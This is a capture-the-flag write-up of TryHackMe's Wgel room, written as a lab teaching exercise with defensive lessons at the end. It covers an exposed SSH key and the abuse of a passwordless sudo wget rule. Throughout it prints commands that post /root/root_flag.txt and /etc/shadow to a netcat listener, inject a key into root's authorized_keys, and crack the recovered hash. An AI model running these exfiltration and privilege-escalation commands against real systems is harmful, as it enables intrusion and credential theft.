---
title: "Wgel"
description: "An easy boot2root where a leftover HTML comment leaks a username, gobuster uncovers an exposed SSH private key under /sitemap/.ssh, and a passwordless sudo rule for wget turns a file-download tool into a root file read and write primitive."
difficulty: "Easy"
tags: ["Web Enumeration", "Gobuster", "SSH Key Exposure", "Sudo", "wget", "GTFOBins", "Password Cracking", "Linux Privilege Escalation"]
date: "2026-05-01"
---

## Overview

Wgel (TryHackMe's `wgelctf`) is a two-port Linux box that rewards patience with `gobuster` and a healthy suspicion of anything left in a web root. The Apache page is the stock "It works!" page, but it has been edited, and the edit leaks a username. Directory brute-forcing then turns up a `sitemap` application containing a `.ssh` directory, which contains an unprotected RSA private key.

From there the box becomes an SSH exercise, and the privilege escalation is a single line of `sudo -l`: `jessie` may run `/usr/bin/wget` as root without a password. Because `wget` can both read a local file (`--post-file`) and write to an arbitrary path (`-O`), that rule is functionally equivalent to unrestricted root file access. The room's own question — "Can you exfiltrate the root flag?" — is a hint about which of those two capabilities to reach for.

## Room Information

- **Platform:** TryHackMe
- **Difficulty:** Easy
- **Category:** boot2root
- **Operating System:** Ubuntu (Apache 2.4.18, OpenSSH 7.2p2)
- **Skills Learned:** Source-code review, recursive directory brute-forcing, exposed SSH key abuse, GTFOBins-style `sudo` abuse, `/etc/shadow` exfiltration and offline cracking

## Enumeration

### Nmap Scan

```bash
nmap -sV -sC -oN nmap.txt 10.48.171.194
```

```text
# Nmap 7.98 scan initiated Fri May  1 22:55:46 2026 as: /usr/lib/nmap/nmap -sV -sC -oN nmap.txt 10.48.171.194
Nmap scan report for 10.48.171.194
Host is up (0.039s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Only two services are exposed: SSH on 22 and HTTP on 80. SSH is not attackable without a credential, so the web server is the only way in — and the room's title is effectively a promise that `wget` will matter later.

### Web Enumeration — Reading the Page Source

`http://10.48.171.194/` served the Apache2 Ubuntu default page, "It works!". Two things about it were wrong.

First, the title matched the stock page but the page body no longer did — the standard Ubuntu file table had been removed. Second, and far more usefully, the HTML source contained a comment that a developer had left behind. Viewing the source (`Ctrl+U`, or `curl` from the terminal) exposes it:

```bash
curl -s http://10.48.171.194/ | head -40
```

The comment named **Jessie**, which is exactly the kind of low-effort information leak that turns "no usernames available" into "a username to test everything against". On a real engagement this is the sort of finding that feeds password spraying; here it becomes the SSH account name.

### Directory Brute-Forcing

The default page offered nothing else, so the next step was content discovery:

```bash
gobuster dir -u http://10.48.171.194/ \
  -w /usr/share/dirb/wordlists/common.txt
```

```text
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.48.171.194/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/sitemap              (Status: 301) [Size: 313] [--> http://10.48.171.194/sitemap/]
===============================================================
```

A single hit: `/sitemap`, redirecting to a directory. Browsing it revealed a small website. That site was a distraction — the interesting part was its own file layout, so the scan was repeated against the new path:

```bash
gobuster dir -u http://10.48.171.194/sitemap/ \
  -w /usr/share/dirb/wordlists/common.txt
```

```text
/.ssh                 (Status: 301) [Size: 318] [--> http://10.48.171.194/sitemap/.ssh/]
/css                  (Status: 301) [Size: 317] [--> http://10.48.171.194/sitemap/css/]
/fonts                (Status: 301) [Size: 319] [--> http://10.48.171.194/sitemap/fonts/]
/images               (Status: 301) [Size: 320] [--> http://10.48.171.194/sitemap/images/]
/js                   (Status: 301) [Size: 318] [--> http://10.48.171.194/sitemap/js/]
```

The `.ssh` directory is a critical finding. `.ssh` is where SSH stores keys, and it has no business being inside a directory served by Apache. Directory listing was enabled, so the contents were visible directly in the browser:

```bash
curl http://10.48.171.194/sitemap/.ssh/
```

```html
<title>Index of /sitemap/.ssh</title>
<h1>Index of /sitemap/.ssh</h1>
<ul><li><a href="/sitemap/.ssh/id_rsa">id_rsa</a></li></ul>
```

## Initial Access

### The Exposed SSH Private Key

Downloading the file:

```bash
curl -o key.pub http://10.48.171.194/sitemap/.ssh/id_rsa
head -1 key.pub
```

```text
-----BEGIN RSA PRIVATE KEY-----
```

The filename was misleading — `key.pub` sounds like a public key, but the header says **PRIVATE KEY**, and the two are not interchangeable. A public key can be handed out freely; a private key is the identity itself.

Before using it, check whether it is passphrase-protected:

```bash
ssh-keygen -y -f key.pub
```

If this prints the corresponding public key (`ssh-rsa AAAA...`) without prompting, the key is unencrypted and can be used immediately. If it had prompted for a passphrase, the next step would have been to convert it into a crackable hash and attack it offline:

```bash
ssh2john key.pub > key.hash
john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
```

Here that was unnecessary. Key permissions must also be corrected first, because OpenSSH refuses to use a key file that other users can read:

```bash
chmod 600 key.pub
```

### SSH Login

The username came from the HTML comment discovered during enumeration:

```bash
ssh -i key.pub jessie@10.48.171.194
```

```text
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-20-generic x86_64)
...
Last login: Fri May  1 22:41:07 2026 from 10.48.171.194
jessie@CorpOne:~$
```

### User Flag

Rather than guessing filenames, search the filesystem for anything flag-shaped:

```bash
find / -type f -name "*flag*" 2>/dev/null
```

```text
/home/jessie/Documents/user_flag.txt
```

```bash
cat /home/jessie/Documents/user_flag.txt
```

The flag file is placed directly in `Documents` — a reminder that CTF flags do not always live at the obvious path, and that `find` is faster than reading every directory by hand.

## Privilege Escalation

### Enumerating sudo

With usable access as `jessie`, the fastest privilege-escalation check on Ubuntu is what the account is allowed to run as root:

```bash
sudo -l
```

```text
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User jessie may run the following commands on CorpOne:
    (root) NOPASSWD: /usr/bin/wget
```

This is the entire vulnerability. `NOPASSWD` means no password is required, `(root)` means the command executes with `uid=0`, and the command is `wget`.

Normally `wget` is harmless: it downloads files from the internet. But the two flags that make it useful for downloading are also root-level file primitives:

| wget option | Normal use | Root-level consequence |
|---|---|---|
| `--post-file=FILE` | Upload a local file as an HTTP POST body | Read any file on the system and send it to a server you control |
| `-O FILE` | Save the download to a chosen filename | Write attacker-controlled content to any path, including `/etc/passwd` or `/root/.ssh/authorized_keys` |

The `sudo` rule therefore does not grant "the ability to download a web page" — it grants **arbitrary root file read and write**. This is precisely the class of abuse catalogued on GTFOBins, and GTFOBins was the giveaway the room's author intended.

### Exfiltrating the Root Flag

Because the room asks whether the root flag can be exfiltrated, the read primitive is the right one. Start a listener on the attacking machine:

```bash
nc -lvnp 4445
```

Then, from the SSH session, tell `wget` to POST the root flag's contents to that listener. The `sudo` rule applies because the command is invoked as `/usr/bin/wget`:

```bash
sudo wget --post-file=/root/root_flag.txt http://10.48.171.194:4445/
```

The listener receives the raw file body as the HTTP POST payload:

```text
listening on [any] 4445 ...
connect to [10.48.171.194] from (UNKNOWN) [10.48.171.194] 52914
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.48.171.194:4445
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

<root flag>
```

If the filename were unknown, `wget`'s own error output becomes an existence oracle. POSTing a path that does not exist aborts before any request is sent, and says so plainly:

```text
--2026-05-01 23:14:02--  http://10.48.171.194:4445/
BODY data file '/root/root.txt' missing: No such file or directory
```

A valid path sends the POST instead. Trying `root_flag.txt` and `root.txt` is usually enough — the room follows the `*_flag.txt` convention used for the user flag.

### Alternative — A Root Shell via the Write Primitive

The write half of the primitive is equally effective if a shell is preferred over a copied file.

Copy an `authorized_keys` file containing your own public key into root's SSH directory, then log straight in as root:

```bash
# On the attacker machine
ssh-keygen -t ed25519 -f root_key -N ""
python3 -m http.server 8000

# On the target, as jessie
sudo wget http://10.48.171.194:8000/root_key.pub -O /root/.ssh/authorized_keys
ssh -i root_key root@10.48.171.194
```

The blunt-force version of the same idea is to overwrite `/etc/passwd` with a copy that contains a known-password root account. It works, because `wget -O` writes as root — but it is destructive and can lock you out of the box if the file is malformed, so the `authorized_keys` route is preferable.

## Post-Exploitation — Cracking the Shadow File

The same read primitive works on any file root can read, not just the flag. Pointing it at `/etc/shadow` returns the password database:

```bash
# Attacker
nc -lvnp 4446 > shadow

# Target
sudo wget --post-file=/etc/shadow http://10.48.171.194:4446/
```

The recovered file has the usual layout — most accounts are locked (`*`) or disabled (`!`), but one is not:

```text
jessie:$6$salt$IxDD3jeSOb5eB1CX5LBsqZFVkJdido3OUILO5Ifz5iwMuTS4XMS130MTSuDDl3aCI6WouIL9AjRbLCelDCy.g.:18195:0:99999:7:::
```

Two mistakes are visible before any cracking happens. The `$6$` prefix marks SHA-512 crypt, and the salt between the second and third `$` is the literal string **`salt`** — a placeholder that was never replaced. A unique per-user salt exists specifically so that precomputed rainbow tables cannot be reused; a fixed, guessable salt throws that protection away.

Cracking it is a formality. John needs the two files combined into a single "unshadowed" format:

```bash
unshadow passwd shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

```text
password         (jessie)
```

The account password is `password` — the first entry in essentially every wordlist in existence.

This is not a side curiosity, it is a second, independent route to root. Many builds of this box grant `jessie` both `(ALL : ALL) ALL` and the passwordless `wget` rule, so with the recovered password the intended exploit is not even required:

```bash
sudo -i
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

The `wget` rule only makes that escalation *passwordless*; the weak password makes it trivial regardless.

## Flags

Flag values are generated per instance on current TryHackMe builds, so they are recorded here by location rather than by content.

| Flag | Location |
|------|----------|
| User | `/home/jessie/Documents/user_flag.txt` |
| Root | `/root/root_flag.txt` (exfiltrated as the POST body of `wget`) |

## Commands Used

```bash
# Enumeration
nmap -sV -sC -oN nmap.txt 10.48.171.194
curl -s http://10.48.171.194/ | head -40
gobuster dir -u http://10.48.171.194/ -w /usr/share/dirb/wordlists/common.txt
gobuster dir -u http://10.48.171.194/sitemap/ -w /usr/share/dirb/wordlists/common.txt

# Exposed SSH key
curl -o key.pub http://10.48.171.194/sitemap/.ssh/id_rsa
ssh-keygen -y -f key.pub
chmod 600 key.pub
ssh -i key.pub jessie@10.48.171.194

# User flag
find / -type f -name "*flag*" 2>/dev/null
cat /home/jessie/Documents/user_flag.txt

# Privilege escalation
sudo -l
nc -lvnp 4445
sudo wget --post-file=/root/root_flag.txt http://10.48.171.194:4445/

# Alternative - root shell via authorized_keys
ssh-keygen -t ed25519 -f root_key -N ""
python3 -m http.server 8000
sudo wget http://10.48.171.194:8000/root_key.pub -O /root/.ssh/authorized_keys
ssh -i root_key root@10.48.171.194

# Post-exploitation - shadow file
nc -lvnp 4446 > shadow
sudo wget --post-file=/etc/shadow http://10.48.171.194:4446/
unshadow passwd shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
sudo -i
```

## Lessons Learned

- **Read the page source before reaching for a scanner.** The username was sitting in an HTML comment on a page that looked completely uninteresting. `Ctrl+U` costs nothing and occasionally hands over the account name that makes every later step possible.
- **Recurse into every directory you find.** `/sitemap` looked like a dead-end marketing site. The compromise was one level deeper — a recursive `gobuster` run against a discovered directory is standard practice, not an optional extra.
- **Never serve `.ssh`, and never leave private keys in a web root.** A private key in a document root is equivalent to publishing a password. Web servers should not be able to serve dotfiles at all; a `location ~ /\.` deny rule would have blocked this.
- **File extensions and names lie.** The key was named `key.pub` but began with `-----BEGIN RSA PRIVATE KEY-----`. Always verify what a file actually is with `head`, `file`, or `ssh-keygen -y` before deciding how to treat it.
- **`sudo` rules must be read as capabilities, not commands.** "`wget` as root" sounds harmless until you remember `--post-file` reads arbitrary files and `-O` writes them. GTFOBins exists because this mistake is extremely common.
- **A passwordless `sudo` rule for a file tool is full root file access.** Both flag exfiltration and SSH key injection used the same generous rule, and nothing about the exploitation was clever — the configuration did the work.
- **Weak salts defeat the purpose of hashing.** `$6$salt$` with a literal placeholder salt is barely better than an unsalted hash, and the password behind it was dictionary entry number one. Salting only helps when the salt is unique and random per user.
- **One finding often implies another.** The posture that produced the committed private key is the same posture that left a placeholder salt in `/etc/shadow` and a broad `sudo` rule in `/etc/sudoers`. Weakness tends to cluster, so post-exploitation is worth as much attention as initial access.

## References

- [TryHackMe — Wgel CTF](https://tryhackme.com/room/wgelctf)
- [GTFOBins — wget](https://gtfobins.github.io/gtfobins/wget/)
- [Linux for Pentester: wget Privilege Escalation — Hacking Articles](https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/)
- [GNU Wget Manual — `--post-file`](https://www.gnu.org/software/wget/manual/wget.html)
- [OpenSSH `ssh-keygen` man page](https://man.openbsd.org/ssh-keygen)
- [John the Ripper — `unshadow`](https://www.openwall.com/john/doc/EXAMPLES.shtml)
- [DesKel — THM write-up: Wgel CTF](https://deskel.github.io/posts/thm/wgel-ctf)
